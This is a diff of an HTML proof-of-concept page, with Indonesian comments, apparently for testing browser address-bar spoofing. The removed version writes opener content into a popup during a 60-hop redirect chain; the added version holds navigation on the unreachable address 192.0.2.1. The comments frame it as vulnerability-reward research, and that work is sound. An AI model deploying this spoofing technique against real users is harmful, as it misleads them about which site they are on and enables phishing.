@@ -1,55 +1,14 @@
-<!-- MEKANISME: rantai redirect yang melampaui batas hop membuat navigasi menggantung; opener menulis ke about:blank popup selagi address bar melukis URL awal rantai. -->
-<meta charset="utf-8">
-<title>3 - Hang via rantai redirect tak berujung (Knob A)</title>
-<style>
-body{font:15px/1.6 system-ui,Segoe UI,Arial,sans-serif;margin:24px;max-width:780px;color:#111}
-code{background:#eee;padding:2px 5px;border-radius:3px;word-break:break-all}
-.box{border:1px solid #ccc;border-left:5px solid #666;padding:2px 14px;margin:14px 0;background:#fafafa}
-.v{color:#a00}.s{color:#060}
-button{font:15px inherit;padding:10px 14px;margin:6px 8px 6px 0;cursor:pointer}
-#log{min-height:1.6em;font-weight:600}
-</style>
-
-<h2>3 &mdash; Hang via rantai redirect tak berujung (Knob A)</h2>
-
-<p>URL asli halaman ini: <code id="here"></code></p>
-
-<div class="box">
-<p><b>Mekanisme:</b> rantai 60 hop redirect, jauh di atas batas ~20 hop browser. Navigasi tetap <i>pending</i> selama seluruh rantai (hop x RTT) dan berakhir di halaman error, bukan commit. Selama itu <code>about:blank</code> awal popup masih milik opener.</p>
-<p class="v"><b>VULNERABLE:</b> address bar popup menampilkan <code id="t1"></code> padahal badan halaman melaporkan <code>location.href</code> aslinya <code>about:blank</code>.</p>
-<p class="s"><b>SECURE:</b> address bar popup menampilkan <code>about:blank</code> selama rantai berjalan, lalu halaman error redirect &mdash; URL rantai tidak pernah diatribusikan ke dokumen tulisan opener.</p>
-<p><b>Catatan jaringan:</b> bila host di bawah sedang mati, ganti konstanta <code>HANG</code>/<code>GOOD</code> ke <code>https://httpbingo.org/redirect/60</code> atau <code>https://nghttp2.org/httpbin/redirect/60</code> (jalur kode tidak berubah).</p>
-</div>
-
-<button id="run">Jalankan mekanisme (rantai 60 hop)</button>
-<button id="ctrl">Lengan KONTROL (rantai 1 hop, commit)</button>
-
-<p id="log"></p>
-<p>Satu-satunya variabel yang berubah antara dua tombol adalah panjang rantai redirect.</p>
-
+<!-- 03 - hold TEST-NET (jalan offline)   [address-bar spoofing | macOS: semua macOS]
+     MEKANISME : penggantung = 192.0.2.1 (TEST-NET-1, dijamin timeout) sehingga tak butuh jaringan target sama sekali.
+     PREDIKAT  : bilah menahan URL yang tak pernah tersambung.
+     AMAN      : bilah menampilkan error/origin asli.
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>03 hold TEST-NET (jalan offline)</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var HANG = 'https://httpbin.org/redirect/60';
-var GOOD = 'https://httpbin.org/redirect/1';
-document.getElementById('here').textContent = location.href;
-document.getElementById('t1').textContent = HANG;
-function log(m){ document.getElementById('log').textContent = m; }
-function paint(w, label){
-  if(!w){ log('Popup diblokir - izinkan popup untuk situs ini lalu ulangi.'); return; }
-  try{
-    w.document.write('<meta charset="utf-8"><title>DEMO MARKER</title>'
-      + '<body style="font:16px/1.5 sans-serif;padding:24px">'
-      + '<div style="font-size:32px;font-weight:700">DEMO MARKER</div>'
-      + '<p>' + label + '</p>'
-      + '<p>Teks ini ditulis oleh opener, bukan oleh server mana pun.</p>'
-      + '<p>location.href dokumen ini: <b id="u">?</b></p>'
-      + '<p>Bandingkan dengan address bar jendela ini.</p>'
-      + '<script>setInterval(function(){document.getElementById("u").textContent=location.href},300)<\/script>');
-    w.document.close();
-    log('Dokumen ditulis. Screenshot address bar popup + badan popup sebelum halaman error muncul.');
-  }catch(e){ log('Tulis DITOLAK (dokumen sudah commit ke origin lain) = perilaku SECURE.'); }
-}
-function go(url,label){ var w = window.open(url,'_blank','width=780,height=460');
-  setTimeout(function(){ paint(w,label); }, 60); }
-document.getElementById('run').onclick  = function(){ go(HANG,'lengan UJI - rantai 60 hop'); };
-document.getElementById('ctrl').onclick = function(){ go(GOOD,'lengan KONTROL - rantai 1 hop'); };
+var T='https://192.0.2.1/';o.textContent='REAL: '+location.origin;
+function go(){document.write('<h2>hold TEST-NET - '+location.origin+'</h2>');location=T;setInterval(function(){location=T;},9800);}
 </script>
